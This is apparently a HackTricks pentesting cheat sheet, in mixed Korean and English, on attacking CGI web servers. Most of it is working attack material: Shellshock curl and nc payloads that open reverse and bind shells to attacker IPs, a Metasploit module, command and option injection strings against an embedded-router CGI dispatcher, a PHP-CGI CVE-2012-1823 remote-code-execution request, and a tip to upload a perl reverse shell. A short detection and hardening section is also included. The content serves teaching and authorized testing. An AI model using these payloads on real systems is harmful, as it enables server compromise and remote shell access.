# CGI Pentesting

{{#include ../../banners/hacktricks-training.md}}


## 정보

The **CGI scripts are perl scripts**, so, if you have compromised a server that can execute _**.cgi**_ scripts you can **upload a perl reverse shell** (`/usr/share/webshells/perl/perl-reverse-shell.pl`), **change the extension** from **.pl** to **.cgi**, give **execute permissions** (`chmod +x`) and **access** the reverse shell **from the web browser** to execute it.
CGI vulns를 테스트하기 위해 `nikto -C all` (및 모든 플러그인) 사용을 권장한다.

## **ShellShock**

**ShellShock**는 Unix 기반 운영체제에서 널리 사용되는 명령줄 쉘인 **Bash**에 영향을 미치는 **vulnerability**이다. 이 취약점은 애플리케이션이 전달한 명령을 Bash가 실행하는 능력을 겨냥한다. 취약점은 프로세스의 동작에 영향을 주는 동적 이름 값인 **environment variables**의 조작에 있다. 공격자는 여기에 **malicious code**를 붙여 변수가 전달될 때 실행되도록 하여 시스템을 침해할 수 있다.

이 취약점을 악용하면 **페이지가 오류를 발생시킬 수 있다**.

이 취약점을 **찾을 수 있다**는 것은 **old Apache version**과 **cgi_mod** (with cgi folder)을 사용 중인지 확인하거나 **nikto**를 사용하는 것으로 알 수 있다.

### **테스트**

대부분의 테스트는 echo로 무언가를 출력하고 해당 문자열이 웹 응답에 반환되는지를 확인하는 방식이다. 페이지가 취약할 수 있다고 생각되면 모든 cgi pages를 찾아 테스트하라.

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(reflected, blind and out-of-band\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
### Exploit
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
## 중앙집중형 CGI 디스패처 (selector 매개변수를 통한 단일 엔드포인트 라우팅)

많은 임베디드 웹 UI는 단일 CGI 엔드포인트(예: `/cgi-bin/cstecgi.cgi`) 뒤에 수십 가지 권한 있는 동작을 다중화하고, `topicurl=<handler>`와 같은 selector 매개변수를 사용해 요청을 내부 함수로 라우팅합니다.

Methodology to exploit these routers:

- Enumerate handler names: scrape JS/HTML, brute-force with wordlists, or unpack firmware and grep for handler strings used by the dispatcher.
- Test unauthenticated reachability: some handlers forget auth checks and are directly callable.
- Focus on handlers that invoke system utilities or touch files; weak validators often only block a few characters and might miss the leading hyphen `-`.

Generic exploit shapes:
```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# 1) Option/flag injection (no shell metacharacters): flip argv of downstream tools
topicurl=<handler>&param=-n

# 2) Parameter-to-shell injection (classic RCE) when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;

# 3) Validator bypass → arbitrary file write in file-touching handlers
topicurl=setWizardCfg&<crafted_fields>=/etc/init.d/S99rc
```
탐지 및 강화:

- 중앙화된 CGI 엔드포인트로의 인증되지 않은 요청 중 `topicurl`이 민감한 handlers로 설정된 것을 주시하세요.
- 앞에 `-`로 시작하는 파라미터를 탐지하세요 (argv option injection attempts).
- 벤더: 모든 상태 변경 handlers에 대해 인증을 강제하고, 엄격한 allowlists/types/lengths로 검증하며, 사용자 제어 문자열을 command-line flags로 절대 전달하지 마세요.

## 구형 PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

기본적으로 cgi가 활성화되어 있고 php가 "구형" \(&lt;5.3.12 / &lt; 5.4.2\)인 경우 코드를 실행할 수 있습니다.
이 취약점을 악용하려면 웹 서버의 PHP 파일에 파라미터를 보내지 않고 접근해야 합니다 \(특히 문자 "="을 보내지 않고\).
그런 다음 이 취약점을 테스트하려면 예를 들어 `/index.php?-s` \(`-s`에 주의\)에 접근하면 **애플리케이션의 소스 코드가 응답에 나타납니다**.

그런 다음 **RCE**를 얻기 위해서는 다음 특수 쿼리를 보낼 수 있습니다: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` 그리고 실행할 **PHP 코드**는 요청의 **본문**에 넣습니다.
Example:
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**취약점 및 가능한 익스플로잇에 대한 추가 정보:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup Example**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**

## **Proxy \(MitM to Web server requests\)**

CGI는 http request의 각 헤더마다 환경 변수를 생성합니다. 예를 들어: "host:web.com"은 "HTTP_HOST"="web.com"으로 생성됩니다.

웹 서버가 HTTP_PROXY 변수를 사용할 수 있으므로, 다음을 포함하는 **header**를 전송해 보세요: "**Proxy: &lt;IP_attacker&gt;:&lt;PORT&gt;**" 그리고 세션 중 서버가 어떤 요청을 수행하면, 서버가 만든 각 요청을 캡처할 수 있습니다.

## **참고자료**

- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../../banners/hacktricks-training.md}}
